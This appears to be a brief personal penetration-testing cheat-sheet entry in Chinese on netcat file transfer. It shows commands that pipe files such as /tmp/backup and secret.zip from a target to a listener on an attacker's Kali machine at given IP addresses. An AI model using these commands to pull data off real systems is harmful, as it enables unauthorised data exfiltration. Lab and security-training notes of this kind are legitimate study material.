# nc传输

```bash
4444端口是kali

nc 10.9.17.253 4444 < /tmp/backup
nc -lnvp 4444 > backup
或者
先kali
nc -l -p 1234 > secret.zip < /dev/null
再
cat secret.zip | nc 10.10.14.63 1234
```
